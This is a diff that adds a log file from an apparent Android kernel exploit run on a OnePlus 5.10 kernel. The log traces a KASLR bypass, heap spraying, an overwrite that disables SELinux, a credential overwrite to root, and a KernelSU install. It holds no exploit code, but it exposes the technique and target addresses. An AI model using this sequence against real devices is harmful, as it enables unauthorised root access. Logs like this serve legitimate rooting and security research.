@@ -1,0 +1,42 @@
+[*] kernel: 5.10.240-android12-9-00006-g25161a557b20-ab14744618
+[+] offsets matched: 5.10.240-android12-9-00006-g25161a557b20-ab14744618
+[*] init_cred image=ffffffc00a7c0a60 alias=ffffff802a7c0a60
+[*] kphys_load=0xa8000000 phys_offset=0x80000000 page_offset=0xffffff8000000000
+[+] startup context pid=6676 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=6676 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=6676 label=ghostlock_oneplus slide=pselect main=pselect
+[*] [T+0ms] exploit start
+[*] kaslr detect: collected 1024 kernel IPs
+[*] kaslr detect: densest 4KB window: 842 IPs at [0xffffffe579c01e9c..0xffffffe579c02be8]
+[+] kaslr detect: base=0xffffffe579200000 slide=0x2571200000
+[+] KASLR: base=0xffffffe579200000 slide=0x2571200000
+[*] [T+3037ms] pre-W1 drain
+[*] Write 1 attempt 1/5
+[*] W1 target: 0xffffffe57bc52b90 (KIMAGE via KASLR slide) selinux_state=0xffffffe57bc52b90
+[*] === W1: SELinux === target=0xffffffe57bc52b90 mode=1
+[*] [T+3037ms]   heap spray start
+[*] pagemap: round 0, forking 512 saturate children (total=0)...
+[*] pagemap: spray 1260/1280 sends
+[*] [T+4906ms]   heap spray done
+[*] SELINUX PRE-pselect: enforce=1
+[*] pselect pre-select +6ms timeout=5.000s
+[*] pselect post-select +57ms ret=6 errno=0
+[*] SELINUX CHECK after pselect: enforce=0
+[+] W1 success — SELinux permissive
+[*] UMH not available, falling back to W2 cred path
+[*] [T+15127ms] pre-W2 drain
+[*] child_pid=15744 child_task=0xffffff8826fb5c80
+[*] round 1/10: cred write
+[*] === W2: cred === target=0xffffff8826fb6400 mode=2
+[*] [T+18806ms]   heap spray start
+[*] W2 init_cred KIMAGE: fake_right=0xffffffe57b9c0a60 off=0x27c0a60
+[*] pagemap: spray 1260/1280 sends
+[*] [T+20836ms]   heap spray done
+[*] SELINUX PRE-pselect: enforce=0
+[*] pselect pre-select +7ms timeout=5.000s
+[*] pselect post-select +58ms ret=8 errno=0
+[*] SELINUX CHECK after pselect: enforce=0
+[+] child is root!
+[+] root shell pid=22233 uid=0
+[*] uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0 enforce=1
+[+] KernelSU ready
